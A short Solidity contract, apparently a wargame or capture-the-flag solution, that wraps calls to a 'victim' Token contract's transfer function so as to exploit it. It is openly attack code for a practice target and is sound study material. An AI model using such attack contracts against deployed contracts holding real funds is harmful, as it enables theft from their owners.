// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "hardhat/console.sol";
import "./Token.sol";

contract TokenAttack {

  Token public victimContract;

  constructor(address _victimContract) {
    victimContract = Token(_victimContract);
  }

  function attack(address _to, uint _value) public {
    victimContract.transfer(_to, _value);
  }
}